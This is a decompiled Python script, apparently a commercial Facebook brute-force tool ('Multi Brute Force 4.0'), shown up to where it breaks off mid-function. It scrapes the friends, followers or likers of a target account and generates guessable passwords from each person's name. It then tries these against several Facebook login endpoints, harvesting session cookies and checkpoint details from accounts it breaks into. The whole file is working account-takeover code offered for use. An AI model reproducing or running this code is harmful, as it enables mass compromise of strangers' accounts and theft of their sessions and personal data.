#DECOMPILE BY: SakuraDevOps
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
import bot_follow_premium
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from urllib.parse import quote

P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
H = "\x1b[0;92m" # Hijau
K = "\x1b[0;93m" # Kuning
B = "\x1b[0;94m" # Biru
U = "\x1b[0;95m" # Ungu
O = "\x1b[0;96m" # Biru Muda
N = "\033[0m"    # Warna Mati

url_license = 'https://ngepetonline.000webhostapp.com/chek.php?project=premiumdapunta&apikey='
host = "https://mbasic.facebook.com"
ok = []
cp = []
ttl = []

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
    if bu < 0 or bu > 12:
        exit()
    buTemp = bu - 1
except ValueError:
    exit()
op = bulan[buTemp]
tanggal = ("%s-%s-%s"%(ha,op,ta))

ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

def jalan(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)
def mlaku(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")
    else:os.system("clear")

def banner():
    print("\x1b[0;97m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 4.0  │  Script By Dapunta Khurayra  │\n       /  ^ \/ / // /  ^ \   │   •• Github.com/Dapunta ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘\n")

def menu_log():
    os.system('rm -rf token.txt')
    clear()
    banner()
    var_menu()
    pmu = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
    print('')
    if pmu in ['']:
        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
        menu_log()
    elif pmu in ['1','01','001','a']:
        defaultua()
        token = input('%s[%s•%s] %sToken : '%(K,P,K,P))
        try:
            x = requests.get("https://graph.facebook.com/me?access_token=" + token)
            y = json.loads(x.text)
            n = y['name']
            xd = open("token.txt", "w")
            xd.write(token)
            xd.close()
            #jalan('\n%s[%s!%s] %sLogin Successful'%(K,P,K,P))
            exit(bot_follow_premium.main())
            #menu()
        except (KeyError,IOError):
            jalan('\n%s[%s!%s] %sToken Invalid'%(M,P,M,P))
            os.system('rm -rf token.txt')
            menu_log()
        except requests.exceptions.ConnectionError:
            jalan('\n%s[%s!%s] %sConnection Error'%(M,P,M,P))
            exit()
    elif pmu in ['2','02','002','b']:
        defaultua()
        cookie = input('%s[%s•%s] %sCookies : '%(K,P,K,P))
        try:
            data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
            "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
            "referer"                   : "https://m.facebook.com/",
            "host"                      : "m.facebook.com",
            "origin"                    : "https://m.facebook.com",
            "upgrade-insecure-requests" : "1",
            "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control"             : "max-age=0",
            "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type"              : "text/html; charset=utf-8"
            }, cookies = {
            "cookie"                    : cookie
            })
            find_token = re.search("(EAAA\w+)", data.text)
            hasil = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
            xd = open("token.txt", "w")
            xd.write(find_token.group(1))
            xd.close()
            #jalan('\n%s[%s!%s] %sLogin Successful'%(K,P,K,P))
            exit(bot_follow_premium.main())
            #menu()
        except requests.exceptions.ConnectionError:
            jalan('\n%s[%s!%s] %sConnection Error'%(M,P,M,P))
            exit()
        except (KeyError,IOError,AttributeError):
            jalan('\n%s[%s!%s] %sCookies Invalid'%(M,P,M,P))
            os.system('rm -rf token.txt')
            menu_log()
    elif pmu in ['3','03','003','c']:
        clear()
        banner()
        var_tutor()
        pf = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
        print('')
        if pf in ['']:
            jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
            menu_log()
        elif pf in ['1','01','001','a']:
            os.system('xdg-open https://youtu.be/IdxphPBMMTU')
            input('%s[ %sBack %s]%s'%(K,P,K,P))
            menu_log()
        elif pf in ['2','02','002','b']:
            os.system('xdg-open https://youtu.be/X7m_O_tZnTc')
            input('%s[ %sBack %s]%s'%(K,P,K,P))
            menu_log()
        elif pf in ['3','03','003','c']:
            os.system('xdg-open https://youtu.be/9snR31AI_h8')
            input('%s[ %sBack %s]%s'%(K,P,K,P))
            menu_log()
        elif pf in ['4','04','004','d']:
            tutor_crack()
            input('%s[ %sBack %s]%s'%(K,P,K,P))
            menu_log()
        else:
            jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
            menu_log()
    elif pmu in ['4','04','004','d']:
        clear()
        banner()
        var_author()
        input('%s[ %sBack %s]%s'%(K,P,K,P))
        menu_log()
    elif pmu in ['0','00','000','e']:
        jalan('%s[%s!%s] %sThanks For Using My SC'%(K,P,K,P))
        jalan('%s[%s!%s] %sHave A Good Day :)\n'%(K,P,K,P))
        os.system('rm -rf token.txt')
        clear()
        exit()
    else:
        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
        menu_log()

def menu():
    clear()
    banner()
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
        wk = json.loads(wl.text)
        kun = lisensi.split('-')
        users = wk['username']
        bergabung = wk['joined']
        kadaluarsa = wk['expired']
        status = ('%sPremium [%sPro%s]'%(K,P,K))
        kunci = ('%s%s%s-%s%s%s-%sXXXXX'%(K,kun[0],P,K,kun[1],P,K))
        pro = ''
        upgrade = 'Change License Key'
        jid = ''
    except (KeyError,IOError):
        status = 'Free User'
        users = '-'
        kunci = '-'
        bergabung = '-'
        kadaluarsa = '-'
        pro = ("%s[%sPro%s]"%(K,P,K))
        upgrade = ('Upgrade To %sPro'%(K))
        jid = ('%s[%s1500 ID%s]'%(K,P,K))
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
        i = y['id']
    except (KeyError,IOError):
        print('%s'%(M))
        jalan('%s[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        print('%s'%(M))
        jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
        exit()
    a = requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()
    try:
        ip = a["query"]
    except KeyError:
        ip = " "
    print('%s[ %sWelcome %s %s]'%(K,P,n,K))
    print('\n%s[%s•%s] %sID : %s'%(K,P,K,P,i))
    print('%s[%s•%s] %sIP : %s'%(K,P,K,P,ip))
    print('\n%s[%s•%s] %sStatus : %s'%(K,P,K,P,status))
    print('%s[%s•%s] %sName : %s'%(K,P,K,P,users))
    print('%s[%s•%s] %sKey : %s'%(K,P,K,P,kunci))
    print('%s[%s•%s] %sJoined : %s'%(K,P,K,P,bergabung))
    print('%s[%s•%s] %sExpired : %s'%(K,P,K,P,kadaluarsa))
    print('\n%s[%s1%s] %sCrack ID Friend/Public %s'%(K,P,K,P,jid))
    print('%s[%s2%s] %sCrack ID Followers %s'%(K,P,K,P,jid))
    print('%s[%s3%s] %sCrack ID Likers Post %s'%(K,P,K,P,jid))
    print('%s[%s4%s] %sGet Data Target'%(K,P,K,P))
    print('%s[%s5%s] %sDump Amount Of Friend %s'%(K,P,K,P,pro))
    print('%s[%s6%s] %sSee Result Crack'%(K,P,K,P))
    print('%s[%s7%s] %sCheck Option Result Crack %s'%(K,P,K,P,pro))
    print('%s[%s8%s] %sUser Agent'%(K,P,K,P))
    print('%s[%s9%s] %s%s'%(K,P,K,P,upgrade))
    print('%s[%s0%s] %sLog Out'%(K,P,K,P))
    pm = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
    print('')
    if pm in ['']:
        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
        menu()
    elif pm in ['1','01','001','a']:
        publik()
    elif pm in ['2','02','002','b']:
        pengikut()
    elif pm in ['3','03','003','c']:
        likers()
    elif pm in ['4','04','004','d']:
        target()
    elif pm in ['5','05','005','e']:
        teman_target()
    elif pm in ['6','06','006','f']:
        hasil()
    elif pm in ['7','07','007','g']:
        cek_hasil()
    elif pm in ['8','08','008','h']:
        ugen()
    elif pm in ['9','09','009','i']:
        buy_license()
    elif pm in ['0','00','000','j']:
        jalan('%s[%s!%s] %sSampai Jumpa'%(K,P,K,P))
        os.system('rm -rf token.txt')
        menu_log()
    else:
        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
        menu()

def defaultua():
    ua = ua_xiaomi
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError,IOError):
        menu_log()

def ugen():
    var_ugen()
    pmu = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
    print('')
    if pmu in[""]:
        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
        menu()
    elif pmu in ['1','01','001','a']:
        os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8')
        input('%s[ %sBack %s]%s'%(K,P,K,P))
        menu()
    elif pmu in ['2','02','002','b']:
        os.system("rm -rf ugent.txt")
        ua = input("%s[%s•%s] %sInput User Agent : \n\n"%(K,P,K,P))
        try:
            ugent = open('ugent.txt','w')
            ugent.write(ua)
            ugent.close()
            jalan("\n%s[ %sSuccess Changed User Agent %s]"%(K,P,K))
            input('\n%s[ %sBack %s]%s'%(K,P,K,P))
            menu()
        except (KeyError,IOError):
            jalan("\n%s[ %sFailed To Change User Agent %s]"%(M,P,M))
            print('%s'%(M))
            input('%s[ %sBack %s]%s'%(M,P,M,P))
            menu()
    elif pmu in ['3','03','003','c']:
        ugen_hp()
    elif pmu in ['4','04','004','d']:
        os.system("rm -rf ugent.txt")
        jalan("%s[ %sSuccess Remove User Agent %s]"%(K,P,K))
        input('\n%s[ %sBack %s]%s'%(K,P,K,P))
        menu()
    elif pmu in ['5','05','005','e']:
        try:
            ungser = open('ugent.txt', 'r').read()
        except (KeyError,IOError):
            ungser = 'Not Found'
        print("%s[%s•%s] %sUser Agent Used : \n\n%s%s"%(K,P,K,P,K,ungser))
        jalan("\n%s[ %sThis Is Your User Agent Now %s]"%(K,P,K))
        input('\n%s[ %sBack %s]%s'%(K,P,K,P))
        menu()
    elif pmu in ['0','00','000','f']:
        menu()
    else:
        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
def ugen_hp():
    os.system("rm -rf ugent.txt")
    print('%s[%s1%s] %sXiaomi'%(K,P,K,P))
    print('%s[%s2%s] %sNokia'%(K,P,K,P))
    print('%s[%s3%s] %sAsus'%(K,P,K,P))
    print('%s[%s4%s] %sHuawei'%(K,P,K,P))
    print('%s[%s5%s] %sVivo'%(K,P,K,P))
    print('%s[%s6%s] %sOppo'%(K,P,K,P))
    print('%s[%s7%s] %sSamsung'%(K,P,K,P))
    print('%s[%s8%s] %sWindows'%(K,P,K,P))
    pc = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
    print('')
    if pc in['']:jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P));menu()
    elif pc in ['1','01']:
        ugent = open('ugent.txt','w');ugent.write(ua_xiaomi);ugent.close()
    elif pc in ['2','02']:
        ugent = open('ugent.txt','w');ugent.write(ua_nokia);ugent.close()
    elif pc in ['3','03']:
        ugent = open('ugent.txt','w');ugent.write(ua_asus);ugent.close()
    elif pc in ['4','04']:
        ugent = open('ugent.txt','w');ugent.write(ua_huawei);ugent.close()
    elif pc in ['5','05']:
        ugent = open('ugent.txt','w');ugent.write(ua_vivo);ugent.close()
    elif pc in ['6','06']:
        ugent = open('ugent.txt','w');ugent.write(ua_oppo);ugent.close()
    elif pc in ['7','07']:
        ugent = open('ugent.txt','w');ugent.write(ua_samsung);ugent.close()
    elif pc in ['8','08']:
        ugent = open('ugent.txt','w');ugent.write(ua_windows);ugent.close()
    else:jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P));menu()
    jalan("%s[ %sSuccess Changed User Agent %s]"%(K,P,K))
    input('\n%s[ %sBack %s]%s'%(K,P,K,P))
    menu()

def publik():
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
        wk = json.loads(wl.text)
        wj = wk['username']
        jid = '5000'
    except (KeyError,IOError):
        jid = '1500'
    except requests.exceptions.ConnectionError:
        jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
        exit()
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
        jalan('%s[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
        exit()
    try:
        print('%s[%s•%s] %sType \'me\' To Get ID From Friendlist'%(K,P,K,P))
        it = input("%s[%s•%s] %sID Target : "%(K,P,K,P))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s[%s•%s] %sName : %s'%(K,P,K,P,ob['name']))
        except (KeyError,IOError):
            jalan('\n%s[%s!%s] %sID Not Found'%(M,P,M,P))
            menu()
        r = requests.get("https://graph.facebook.com/%s/friends?limit=%s&access_token=%s"%(it,jid,token))
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('%s[%s•%s] %sTotal ID : %s'%(K,P,K,P,len(id)))
        return crack(xc)
    except Exception as e:
        exit('%s[%s!%s] %sError : %s'%(M,P,M,P,e))
def pengikut():
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
        wk = json.loads(wl.text)
        wj = wk['username']
        jid = '10000'
    except (KeyError,IOError):
        jid = '1500'
    except requests.exceptions.ConnectionError:
        jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
        exit()
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
        jalan('%s[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
        exit()
    try:
        print('%s[%s•%s] %sType \'me\' To Get ID From Friendlist'%(K,P,K,P))
        it = input("%s[%s•%s] %sID Target : "%(K,P,K,P))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s[%s•%s] %sName : %s'%(K,P,K,P,ob['name']))
        except (KeyError,IOError):
            jalan('\n%s[%s!%s] %sID Not Found'%(M,P,M,P))
            menu()
        r = requests.get("https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s"%(it,jid,token))
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('%s[%s•%s] %sTotal ID : %s'%(K,P,K,P,len(id)))
        return crack(xc)
    except Exception as e:
        exit('%s[%s!%s] %sError : %s'%(M,P,M,P,e))
def likers():
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
        wk = json.loads(wl.text)
        wj = wk['username']
        jid = '10000'
    except (KeyError,IOError):
        jid = '1500'
    except requests.exceptions.ConnectionError:
        jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
        exit()
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
        jalan('%s[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
        exit()
    try:
        print('%s[%s•%s] %sType \'me\' To Get ID From Friendlist'%(K,P,K,P))
        it = input("%s[%s•%s] %sID Target : "%(K,P,K,P))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s[%s•%s] %sName : %s'%(K,P,K,P,ob['name']))
        except (KeyError,IOError):
            jalan('\n%s[%s!%s] %sID Not Found'%(M,P,M,P))
            menu()
        r = requests.get("https://graph.facebook.com/%s/likes?limit=%s&access_token=%s"%(it,jid,token))
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('%s[%s•%s] %sTotal ID : %s'%(K,P,K,P,len(id)))
        return crack(xc)
    except Exception as e:
        exit('%s[%s!%s] %sError : %s'%(M,P,M,P,e))

def pass_dev(_cici_):
    _dapunta_=[]
    ps = open('pass.txt','r').read()
    pp = open('passangka.txt','r').read()
    for i in _cici_.split(" "):  
        i=i.lower()
        if len(i)<3:
            continue
        elif len(i)==3 or len(i)==4 or len(i)==5:
            _dapunta_.append(i+"123")
            _dapunta_.append(i+"12345")
        else:
            _dapunta_.append(i)
            _dapunta_.append(i+"123")
            _dapunta_.append(i+"12345")
    if pp in ['',' ','  ']:pass
    else:
        for i in _cici_.split(" "):  
            i=i.lower()
            for x in pp.split(','):
                _dapunta_.append(i+x)
    if ps in ['',' ','  ']:pass
    else:
        for z in ps.split(','):
            _dapunta_.append(z)
    _dapunta_.append(_cici_.lower())
    return _dapunta_
def tambah_pass():
    print('%s[%s Set Password %s]'%(K,P,K))
    print('%s[%s•%s] %sExample : sayang,bismillah,123456,786786'%(K,P,K,P))
    cuy = input('%s[%s•%s] %sInput Extra Manual Pass [1 Word] : '%(K,P,K,P))
    gh = open('pass.txt','w')
    gh.write(cuy)
    gh.close
def tambah_pass_angka():
    print('%s[%s•%s] %sExample : 321,786,gaming,ganteng'%(K,P,K,P))
    coy = input('%s[%s•%s] %sInput After Name Pass : '%(K,P,K,P))
    xy = open('passangka.txt','w')
    xy.write(coy)
    xy.close
    
def log_api(em,pas,hosts):
    ua = open('ugent.txt','r').read()
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
        "x-fb-sim-hni": str(random.randint(20000, 40000)),
        "x-fb-net-hni": str(random.randint(20000, 40000)),
        "x-fb-connection-quality": "EXCELLENT",
        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
        "user-agent": ua,
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-http-engine": "Liger"}
    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
        'format': 'json', 
        'sdk_version': '2', 
        'email': em, 
        'locale': 'en_US', 
        'password': pas, 
        'sdk': 'ios', 
        'generate_session_cookies': '1', 
        'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = r.get(api, params=param, headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:
        return {"status":"success","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:
        return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic(em,pas,hosts):
    ua = open('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update(
        {"fb_dtsg":meta,"m_sess":"","__user":"0",
        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
        }
    )
    r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
def log_free(em,pas,hosts):
    ua = open('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://free.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update(
        {"fb_dtsg":meta,"m_sess":"","__user":"0",
        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
        }
    )
    r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
def cek_log(user, pasw, h_cp):
    ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36"
    mb = "https://mbasic.facebook.com"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": mb,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": mb+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print("[!] Redirect Overload")
    if "c_user" in ses.cookies:
        return {"status":"error","email":user,"pass":pasw}
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        xnxx = par(ses.post(mb+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        opsi=[]
        option_dev = []
        for opt in range(len(ngew)):
            option_dev.append("\n     "+P+str(opt+1)+". "+ngew[opt]+" ")
        print(h_cp+"".join(option_dev))
    elif "login_error" in str(run):
        pass
    else:
        pass
def koki(cookies):
    result=[]
    for i in enumerate(cookies.keys()):
        if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
        else:result.append(i[1]+"="+cookies[i[1]]+"; ")
    sample = "".join(result)
    sam_   = sample.replace(' ','')
    samp_  = sam_.split(';')
    final = ('%s; %s; %s; %s; %s'%(samp_[4],samp_[1],samp_[0],samp_[5],samp_[3]))
    return final
def cek_apk(h_ok,_dapunta_):
    apk = []
    ses_ = requests.Session()
    url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
    dat_game = ses_.get(url,cookies={'cookie':_dapunta_})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:
            celeng = asu.find('span').text
            apk.append('\n   • '+celeng)
        except:pass
    url2 = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
    dat_game = ses_.get(url2,cookies={'cookie':_dapunta_})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:
            celeng = asu.find('span').text
            apk.append('\n   • '+celeng)
        except:pass
    print(h_ok+''.join(apk))
def tahun(fx):
    if len(fx)==15:
        if fx[:10] in ['1000000000']       :tahunz = ' • 2009'
        elif fx[:9] in ['100000000']       :tahunz = ' • 2009'
        elif fx[:8] in ['10000000']        :tahunz = ' • 2009'
